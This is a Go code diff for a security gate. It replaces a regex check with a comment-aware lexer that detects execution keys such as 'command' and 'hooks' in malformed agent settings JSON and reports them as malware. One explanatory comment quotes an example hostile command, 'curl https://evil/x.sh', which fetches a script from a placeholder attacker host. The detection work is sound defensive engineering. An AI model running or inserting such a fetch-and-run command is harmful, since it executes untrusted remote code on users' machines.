@@ -33,7 +33,6 @@ import (
 	"os"
 	"os/exec"
 	"path"
-	"regexp"
 	"slices"
 	"strings"
 )
@@ -84,21 +83,6 @@ var executableExtensions = map[string]bool{
 // confirmed real-world malware pattern. The order is fixed so that a file
 // carrying several of them always reports the same one.
 var executionKeys = []string{"command", "hooks"}
-
-// executionKeyPatterns match an execution key in key position — the quoted
-// token followed by a colon — in the same order as executionKeys. The raw-text
-// fallback needs this rather than a bare substring search: `"type": "command"`
-// is the ordinary shape of a hook definition, and matching the token anywhere
-// would report that benign value as confirmed malware.
-var executionKeyPatterns = buildExecutionKeyPatterns()
-
-func buildExecutionKeyPatterns() []*regexp.Regexp {
-	patterns := make([]*regexp.Regexp, len(executionKeys))
-	for i, key := range executionKeys {
-		patterns[i] = regexp.MustCompile(`"` + regexp.QuoteMeta(key) + `"\s*:`)
-	}
-	return patterns
-}
 
 func isExecutionKey(key string) bool {
 	return slices.Contains(executionKeys, key)
@@ -228,15 +212,13 @@ func agentJSONFiles(files []string) []string {
 func scanAgentJSON(p string, content []byte) []finding {
 	var doc any
 	if err := json.Unmarshal(content, &doc); err != nil {
-		for i, pattern := range executionKeyPatterns {
-			if pattern.Match(content) {
-				return []finding{{
-					path:    p,
-					rule:    ruleExecutionKey,
-					detail:  fmt.Sprintf("malformed JSON containing a %q key", executionKeys[i]),
-					malware: true,
-				}}
-			}
+		if key, ok := findExecutionKeyInText(content); ok {
+			return []finding{{
+				path:    p,
+				rule:    ruleExecutionKey,
+				detail:  fmt.Sprintf("malformed JSON containing a %q key", key),
+				malware: true,
+			}}
 		}
 		return nil
 	}
@@ -272,6 +254,105 @@ func findExecutionKey(node any) (string, bool) {
 		}
 	}
 	return "", false
+}
+
+// findExecutionKeyInText reports the first execution key that appears in key
+// position, treating content as JSON-with-comments.
+//
+// This lexes rather than pattern-matching the raw bytes, because the two
+// things it has to tell apart cannot be recognised in isolation. A quoted
+// token only means anything when it is a key: `{"type": "command"}` is the
+// ordinary shape of a hook definition. And "//" only opens a comment outside
+// a string: stripping comments first would cut `"curl https://evil/x.sh"`
+// short and silently drop a real execution key later on the same line — a
+// false negative in a security gate, which is worse than the false positive
+// it set out to fix.
+//
+// It is a best-effort net over content a JSON parser already rejected, not a
+// full parser: scanning stops at an unterminated string, since nothing after
+// it can be located reliably. That bias is deliberate. A miss here only costs
+// the malware escalation — agent settings files are blocked outright by
+// checkPaths whatever they contain — whereas a false hit tells an author their
+// file is confirmed malware and sends them to the security team.
+func findExecutionKeyInText(content []byte) (string, bool) {
+	for i := 0; i < len(content); {
+		switch {
+		case isCommentStart(content, i):
+			i = skipComment(content, i)
+		case content[i] == '"':
+			token, next, ok := lexString(content, i)
+			if !ok {
+				return "", false
+			}
+			i = next
+			if j := skipSpaceAndComments(content, i); j < len(content) && content[j] == ':' && isExecutionKey(token) {
+				return token, true
+			}
+		default:
+			i++
+		}
+	}
+	return "", false
+}
+
+func isCommentStart(b []byte, i int) bool {
+	return b[i] == '/' && i+1 < len(b) && (b[i+1] == '/' || b[i+1] == '*')
+}
+
+// skipComment returns the index just past the comment starting at i. An
+// unterminated block comment swallows the rest of the input, as it would for
+// any consumer that accepts comments at all.
+func skipComment(b []byte, i int) int {
+	if b[i+1] == '/' {
+		for i < len(b) && b[i] != '\n' {
+			i++
+		}
+		return i
+	}
+	for i += 2; i+1 < len(b); i++ {
+		if b[i] == '*' && b[i+1] == '/' {
+			return i + 2
+		}
+	}
+	return len(b)
+}
+
+// skipSpaceAndComments returns the index of the next byte that is neither
+// whitespace nor part of a comment, so that a key is still recognised when a
+// comment sits between it and its colon.
+func skipSpaceAndComments(b []byte, i int) int {
+	for i < len(b) {
+		switch {
+		case b[i] == ' ' || b[i] == '\t' || b[i] == '\n' || b[i] == '\r':
+			i++
+		case isCommentStart(b, i):
+			i = skipComment(b, i)
+		default:
+			return i
+		}
+	}
+	return i
+}
+
+// lexString returns the string beginning at the quote at i and the index just
+// past its closing quote. The token is unescaped with the JSON grammar where
+// possible, so that an escaped spelling such as "command" is compared as
+// the key a consumer would see.
+func lexString(b []byte, i int) (string, int, bool) {
+	for j := i + 1; j < len(b); j++ {
+		switch b[j] {
+		case '\\':
+			j++ // the escaped byte cannot close the string
+		case '"':
+			raw := b[i : j+1]
+			var s string
+			if err := json.Unmarshal(raw, &s); err != nil {
+				s = string(raw[1 : len(raw)-1])
+			}
+			return s, j + 1, true
+		}
+	}
+	return "", len(b), false
 }
 
 // hasSegment reports whether segment appears as a whole path element, so that
